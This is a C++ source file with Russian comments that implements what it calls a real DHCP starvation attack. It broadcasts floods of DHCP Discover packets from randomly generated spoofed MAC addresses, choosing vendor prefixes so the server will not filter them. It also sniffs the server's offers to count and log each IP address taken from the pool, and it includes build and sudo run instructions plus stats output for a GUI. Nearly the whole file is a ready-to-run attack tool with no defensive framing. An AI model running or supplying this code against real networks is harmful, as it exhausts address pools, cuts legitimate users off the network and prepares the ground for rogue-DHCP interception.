// ============================================================
//  DHCPstarvation.cpp  —  реальная DHCP starvation-атака
//  Сборка:
//      mkdir -p bin
//      g++ -O2 -pthread DHCPstarvation.cpp -o bin/DHCPstarvation -lpcap -std=c++11
//
//  Запуск (совместим с GUI):
//      ./DHCPstarvation <iface> <pool_size> <count> <delay> [offer_timeout] [ack_timeout]
//
//  Пример:
//      sudo ./DHCPstarvation wlan0 254 1000 0 30 5
//
//  Печатает в stderr строки, которые парсит main2.py:
//      [STATS] Sent: N, Unique MACs: M, Captured IPs: K
//      [CAPTURED] aa:bb:cc:dd:ee:ff -> 192.168.0.42
// ============================================================

#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>

#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <mutex>
#include <random>
#include <set>
#include <string>
#include <thread>
#include <vector>

// ------------------------------------------------------------
//  Упакованные структуры протокола
// ------------------------------------------------------------
#pragma pack(push, 1)

struct eth_hdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t type;
};

struct ip_hdr {
    uint8_t  ihl_ver;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t check;
};

struct dhcp_hdr {
    uint8_t  op;
    uint8_t  htype;
    uint8_t  hlen;
    uint8_t  hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t  chaddr[16];
    uint8_t  sname[64];
    uint8_t  file[128];
    uint32_t magic;
};

#pragma pack(pop)

// ------------------------------------------------------------
//  Глобальное состояние
// ------------------------------------------------------------
static std::atomic<bool>     g_stop{false};
static std::atomic<uint64_t> g_sent{0};
static std::atomic<uint64_t> g_offers{0};
static std::atomic<uint64_t> g_acks{0};
static std::atomic<uint64_t> g_unique_macs{0};

static std::mutex            g_mtx;
static std::set<uint32_t>    g_captured_ips;   // уникальные IP, полученные через OFFER
static std::set<std::string> g_mac_set;        // уникальные MAC-адреса

static void stop_handler(int) { g_stop = true; }

// ------------------------------------------------------------
//  Реалистичные OUI (первые 3 байта MAC), чтобы сервер не резал
// ------------------------------------------------------------
static const uint8_t OUIS[][3] = {
    {0x00,0x1B,0x21}, {0x00,0x0C,0x29}, {0x08,0x00,0x27}, {0x00,0x50,0x56},
    {0x00,0x15,0x5D}, {0x3C,0x97,0x0E}, {0x00,0x26,0xBB}, {0x00,0x1E,0xC2},
    {0x00,0x25,0x00}, {0x28,0xCF,0xE9}, {0x00,0x23,0xDF}, {0x00,0x14,0x22},
    {0xF0,0x4D,0xA2}, {0x00,0x1A,0xA0}, {0x00,0x21,0x19}, {0x00,0x13,0x02},
    {0x48,0x51,0xB7}, {0xE4,0xCE,0x8F}, {0x00,0x1F,0x16}, {0x00,0x24,0xE8},
};
static const size_t OUI_COUNT = sizeof(OUIS)/sizeof(OUIS[0]);

// ------------------------------------------------------------
//  Контрольная сумма IP (endian-safe, побайтово)
// ------------------------------------------------------------
static uint16_t ip_checksum(const uint8_t* buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len; i += 2) {
        uint16_t w = (uint16_t)buf[i] << 8;
        if (i + 1 < len) w |= buf[i + 1];
        sum += w;
    }
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

// ------------------------------------------------------------
//  Генерация случайного MAC (unicast)
// ------------------------------------------------------------
static void random_mac(uint8_t* mac, std::mt19937& rng) {
    static std::uniform_int_distribution<int> byte_dist(0, 255);
    static std::uniform_int_distribution<size_t> oui_dist(0, OUI_COUNT - 1);

    const uint8_t* oui = OUIS[oui_dist(rng)];
    mac[0] = oui[0]; mac[1] = oui[1]; mac[2] = oui[2];
    mac[3] = (uint8_t)byte_dist(rng);
    mac[4] = (uint8_t)byte_dist(rng);
    mac[5] = (uint8_t)byte_dist(rng);
    // На всякий случай: unicast
    mac[0] &= 0xFE;
}

// ------------------------------------------------------------
//  Сборка DHCP Discover
// ------------------------------------------------------------
static const int DHCP_PAYLOAD = 300;   // размер BOOTP+опций

static size_t build_discover(uint8_t* buf,
                             const uint8_t* client_mac,
                             const uint8_t* src_mac,
                             uint32_t xid,
                             std::mt19937& rng) {
    static std::uniform_int_distribution<int> id_dist(0, 0xFFFF);

    memset(buf, 0, 14 + 20 + 8 + DHCP_PAYLOAD);

    // --- Ethernet ---
    auto* eth = (eth_hdr*)buf;
    memset(eth->dst, 0xFF, 6);
    memcpy(eth->src, src_mac, 6);
    eth->type = htons(0x0800);

    // --- IP ---
    auto* ip = (ip_hdr*)(buf + 14);
    ip->ihl_ver = 0x45;
    ip->tos     = 0;
    ip->tot_len = htons(20 + 8 + DHCP_PAYLOAD);
    ip->id      = htons((uint16_t)id_dist(rng));
    ip->frag    = 0;
    ip->ttl     = 64;
    ip->proto   = 17;               // UDP
    ip->check   = 0;
    ip->saddr   = 0;
    ip->daddr   = htonl(0xFFFFFFFF); // 255.255.255.255
    ip->check   = ip_checksum((uint8_t*)ip, 20);

    // --- UDP ---
    auto* udp = (udp_hdr*)(buf + 14 + 20);
    udp->sport = htons(68);
    udp->dport = htons(67);
    udp->len   = htons(8 + DHCP_PAYLOAD);
    udp->check = 0;                 // 0 = без контрольной суммы (разрешено для IPv4)

    // --- DHCP (BOOTP) ---
    auto* dhcp = (dhcp_hdr*)(buf + 14 + 20 + 8);
    dhcp->op     = 1;               // BOOTREQUEST
    dhcp->htype  = 1;               // Ethernet
    dhcp->hlen   = 6;
    dhcp->hops   = 0;
    dhcp->xid    = htonl(xid);
    dhcp->secs   = 0;
    dhcp->flags  = 0;
    dhcp->ciaddr = 0;
    dhcp->yiaddr = 0;
    dhcp->siaddr = 0;
    dhcp->giaddr = 0;
    memcpy(dhcp->chaddr, client_mac, 6);
    dhcp->magic  = htonl(0x63825363);

    uint8_t* opt = (uint8_t*)dhcp + sizeof(dhcp_hdr);

    // Option 53 : DHCP Message Type = 1 (Discover)
    *opt++ = 53; *opt++ = 1; *opt++ = 1;
    // Option 55 : Parameter Request List
    *opt++ = 55; *opt++ = 4; *opt++ = 1; *opt++ = 3; *opt++ = 6; *opt++ = 15;
    // Option 12 : Hostname
    *opt++ = 12; *opt++ = 4; memcpy(opt, "PC01", 4); opt += 4;
    // Option 60 : Vendor Class Identifier
    *opt++ = 60; *opt++ = 8; memcpy(opt, "MSFT 5.0", 8); opt += 8;
    // End
    *opt++ = 255;

    // Padding до фиксированного размера
    size_t used = (uint8_t*)opt - (uint8_t*)dhcp;
    while (used < (size_t)DHCP_PAYLOAD) { *opt++ = 0; used++; }

    return (size_t)(opt - buf);
                             }

                             // ------------------------------------------------------------
                             //  Поток-отправитель
                             // ------------------------------------------------------------
                             static void sender_thread(pcap_t* handle,
                                                       const uint8_t* real_mac,
                                                       int count,
                                                       double delay) {
                                 std::vector<uint8_t> buf(600);
                                 std::mt19937 rng((uint32_t)std::chrono::steady_clock::now().time_since_epoch().count());
                                 std::uniform_int_distribution<uint32_t> xid_dist(0, 0xFFFFFFFF);

                                 bool error_reported = false;

                                 for (int i = 0; i < count && !g_stop; ++i) {
                                     uint8_t client_mac[6];
                                     random_mac(client_mac, rng);
                                     uint32_t xid = xid_dist(rng);

                                     size_t len = build_discover(buf.data(), client_mac, real_mac, xid, rng);

                                     if (pcap_sendpacket(handle, buf.data(), (int)len) != 0) {
                                         if (!error_reported) {
                                             fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
                                             fflush(stderr);
                                             error_reported = true;
                                         }
                                     } else {
                                         g_sent++;

                                         char mac_str[18];
                                         snprintf(mac_str, sizeof(mac_str),
                                                  "%02x:%02x:%02x:%02x:%02x:%02x",
                                                  client_mac[0], client_mac[1], client_mac[2],
                                                  client_mac[3], client_mac[4], client_mac[5]);
                                         {
                                             std::lock_guard<std::mutex> lk(g_mtx);
                                             g_mac_set.insert(mac_str);
                                             g_unique_macs = g_mac_set.size();
                                         }
                                     }

                                     // Прогресс раз в 50 пакетов
                                     if ((i + 1) % 50 == 0) {
                                         size_t caps;
                                         {
                                             std::lock_guard<std::mutex> lk(g_mtx);
                                             caps = g_captured_ips.size();
                                         }
                                         fprintf(stderr, "[STATS] Sent: %lu, Unique MACs: %lu, Captured IPs: %zu\n",
                                                 (unsigned long)g_sent.load(),
                                                 (unsigned long)g_unique_macs.load(),
                                                 caps);
                                         fflush(stderr);
                                     }

                                     if (delay > 0.0) {
                                         std::this_thread::sleep_for(
                                             std::chrono::microseconds((long)(delay * 1000000.0)));
                                     }
                                 }

                                 // Финальный [STATS] — чтобы GUI обновил счётчик
                                 {
                                     size_t caps;
                                     {
                                         std::lock_guard<std::mutex> lk(g_mtx);
                                         caps = g_captured_ips.size();
                                     }
                                     fprintf(stderr, "[STATS] Sent: %lu, Unique MACs: %lu, Captured IPs: %zu\n",
                                             (unsigned long)g_sent.load(),
                                             (unsigned long)g_unique_macs.load(),
                                             caps);
                                     fflush(stderr);
                                 }
                                                       }

                                                       // ------------------------------------------------------------
                                                       //  Сниффер DHCP-ответов (OFFER / ACK)
                                                       // ------------------------------------------------------------
                                                       static void sniff_callback(u_char* /*user*/,
                                                                                  const struct pcap_pkthdr* hdr,
                                                                                  const u_char* packet) {
                                                           if (hdr->caplen < 14 + 20 + 8 + sizeof(dhcp_hdr)) return;

                                                           auto* eth = (const eth_hdr*)packet;
                                                           if (ntohs(eth->type) != 0x0800) return;

                                                           auto* ip = (const ip_hdr*)(packet + 14);
                                                           int ihl = (ip->ihl_ver & 0x0F) * 4;
                                                           if (ihl < 20) return;
                                                           if (ip->proto != 17) return;

                                                           auto* udp = (const udp_hdr*)(packet + 14 + ihl);
                                                           if (ntohs(udp->sport) != 67 || ntohs(udp->dport) != 68) return;

                                                           auto* dhcp = (const dhcp_hdr*)(packet + 14 + ihl + 8);
                                                           if (dhcp->op != 2) return;   // только ответы сервера

                                                           // Разбор опций: ищем Option 53 (Message Type)
                                                           uint8_t msg_type = 0;
                                                           const uint8_t* opt = (const uint8_t*)dhcp + sizeof(dhcp_hdr);
                                                           const uint8_t* end = packet + hdr->caplen;
                                                           while (opt < end && *opt != 255) {
                                                               if (*opt == 0) { opt++; continue; }
                                                               uint8_t code = opt[0];
                                                               uint8_t olen = opt[1];
                                                               if (opt + 2 + olen > end) break;
                                                               if (code == 53 && olen == 1) {
                                                                   msg_type = opt[2];
                                                                   break;
                                                               }
                                                               opt += 2 + olen;
                                                           }

                                                           if (msg_type == 2) {           // DHCPOFFER
                                                               g_offers++;
                                                               char mac_str[18];
                                                               snprintf(mac_str, sizeof(mac_str),
                                                                        "%02x:%02x:%02x:%02x:%02x:%02x",
                                                                        dhcp->chaddr[0], dhcp->chaddr[1], dhcp->chaddr[2],
                                                                        dhcp->chaddr[3], dhcp->chaddr[4], dhcp->chaddr[5]);
                                                               struct in_addr a; a.s_addr = dhcp->yiaddr;
                                                               fprintf(stderr, "[CAPTURED] %s -> %s\n", mac_str, inet_ntoa(a));
                                                               fflush(stderr);
                                                               {
                                                                   std::lock_guard<std::mutex> lk(g_mtx);
                                                                   g_captured_ips.insert(dhcp->yiaddr);
                                                               }
                                                           } else if (msg_type == 5) {    // DHCPACK
                                                               g_acks++;
                                                           }
                                                                                  }

                                                                                  static void sniffer_thread(pcap_t* handle) {
                                                                                      while (!g_stop) {
                                                                                          int n = pcap_dispatch(handle, 32, sniff_callback, nullptr);
                                                                                          if (n < 0) break;
                                                                                      }
                                                                                  }

                                                                                  // ------------------------------------------------------------
                                                                                  //  main
                                                                                  // ------------------------------------------------------------
                                                                                  int main(int argc, char** argv) {
                                                                                      if (argc < 5) {
                                                                                          fprintf(stderr,
                                                                                                  "Usage: %s <iface> <pool_size> <count> <delay> [offer_timeout] [ack_timeout]\n"
                                                                                                  "Example: %s wlan0 254 1000 0 30 5\n",
                                                                                                  argv[0], argv[0]);
                                                                                          return 1;
                                                                                      }

                                                                                      const char* iface         = argv[1];
                                                                                      int         pool_size     = atoi(argv[2]);
                                                                                      int         count         = atoi(argv[3]);
                                                                                      double      delay         = atof(argv[4]);
                                                                                      int         offer_timeout = (argc > 5) ? atoi(argv[5]) : 30;
                                                                                      int         ack_timeout   = (argc > 6) ? atoi(argv[6]) : 5;

                                                                                      (void)offer_timeout;   // параметр принят для совместимости с GUI
                                                                                      (void)ack_timeout;     // не нужен в режиме flood

                                                                                      if (count <= 0) count = 254;
                                                                                      if (pool_size <= 0) pool_size = 254;

                                                                                      signal(SIGINT,  stop_handler);
                                                                                      signal(SIGTERM, stop_handler);

                                                                                      char errbuf[PCAP_ERRBUF_SIZE];

                                                                                      // Отдельный handle для отправки (без promisc — быстрее)
                                                                                      pcap_t* send_handle = pcap_open_live(iface, 65536, 0, 100, errbuf);
                                                                                      if (!send_handle) {
                                                                                          fprintf(stderr, "pcap_open_live(send) %s: %s\n", iface, errbuf);
                                                                                          return 1;
                                                                                      }
                                                                                      if (pcap_datalink(send_handle) != DLT_EN10MB) {
                                                                                          fprintf(stderr, "Interface %s is not Ethernet (datalink=%d)\n",
                                                                                                  iface, pcap_datalink(send_handle));
                                                                                          pcap_close(send_handle);
                                                                                          return 1;
                                                                                      }

                                                                                      // Отдельный handle для снифа
                                                                                      pcap_t* sniff_handle = pcap_open_live(iface, 65536, 1, 100, errbuf);
                                                                                      if (!sniff_handle) {
                                                                                          fprintf(stderr, "pcap_open_live(sniff) %s: %s\n", iface, errbuf);
                                                                                          pcap_close(send_handle);
                                                                                          return 1;
                                                                                      }

                                                                                      // BPF-фильтр: только DHCP
                                                                                      struct bpf_program fp;
                                                                                      if (pcap_compile(sniff_handle, &fp, "udp and (port 67 or port 68)",
                                                                                          0, PCAP_NETMASK_UNKNOWN) == 0) {
                                                                                          if (pcap_setfilter(sniff_handle, &fp) != 0) {
                                                                                              fprintf(stderr, "pcap_setfilter: %s\n", pcap_geterr(sniff_handle));
                                                                                              fflush(stderr);
                                                                                              // Продолжаем — сниффер будет работать без фильтра
                                                                                          }
                                                                                          pcap_freecode(&fp);
                                                                                          } else {
                                                                                              fprintf(stderr, "pcap_compile failed, no BPF filter\n");
                                                                                              fflush(stderr);
                                                                                          }

                                                                                          // Реальный MAC интерфейса (в него кладём src eth)
                                                                                          uint8_t real_mac[6] = {0};
                                                                                          int s = socket(AF_INET, SOCK_DGRAM, 0);
                                                                                          if (s >= 0) {
                                                                                              struct ifreq ifr;
                                                                                              memset(&ifr, 0, sizeof(ifr));
                                                                                              strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
                                                                                              if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0) {
                                                                                                  memcpy(real_mac, ifr.ifr_hwaddr.sa_data, 6);
                                                                                              }
                                                                                              close(s);
                                                                                          }

                                                                                          printf("DHCP Starvation started on %s\n", iface);
                                                                                          printf("Pool size: %d, Count: %d, Delay: %.4f, Offer timeout: %d, ACK timeout: %d\n",
                                                                                                 pool_size, count, delay, offer_timeout, ack_timeout);
                                                                                          printf("Source MAC (eth): %02x:%02x:%02x:%02x:%02x:%02x\n",
                                                                                                 real_mac[0], real_mac[1], real_mac[2],
                                                                                                 real_mac[3], real_mac[4], real_mac[5]);
                                                                                          fflush(stdout);

                                                                                          auto t0 = std::chrono::steady_clock::now();

                                                                                          std::thread sniffer(sniffer_thread, sniff_handle);

                                                                                          sender_thread(send_handle, real_mac, count, delay);

                                                                                          // Дать снифферу время собрать последние ответы
                                                                                          std::this_thread::sleep_for(std::chrono::milliseconds(300));
                                                                                          g_stop = true;
                                                                                          sniffer.join();

                                                                                          auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                                              std::chrono::steady_clock::now() - t0).count();

                                                                                              size_t caps;
                                                                                              {
                                                                                                  std::lock_guard<std::mutex> lk(g_mtx);
                                                                                                  caps = g_captured_ips.size();
                                                                                              }

                                                                                              printf("\n--- FINAL STATS ---\n");
                                                                                              printf("Total packets sent: %lu\n", (unsigned long)g_sent.load());
                                                                                              printf("Unique MACs generated: %lu\n", (unsigned long)g_unique_macs.load());
                                                                                              printf("Offers received: %lu\n", (unsigned long)g_offers.load());
                                                                                              printf("ACKs received: %lu\n", (unsigned long)g_acks.load());
                                                                                              printf("Captured IP addresses: %zu\n", caps);
                                                                                              printf("Duration: %ld ms\n", (long)ms);
                                                                                              if (ms > 0) {
                                                                                                  printf("Avg rate: %.2f pps\n", (g_sent.load() * 1000.0) / (double)ms);
                                                                                              }
                                                                                              if (caps > 0) {
                                                                                                  printf("Captured IPs:\n");
                                                                                                  std::lock_guard<std::mutex> lk(g_mtx);
                                                                                                  for (auto ip : g_captured_ips) {
                                                                                                      struct in_addr a; a.s_addr = ip;
                                                                                                      printf("  %s\n", inet_ntoa(a));
                                                                                                  }
                                                                                              }
                                                                                              fflush(stdout);

                                                                                              pcap_close(send_handle);
                                                                                              pcap_close(sniff_handle);
                                                                                              return 0;
                                                                                  }
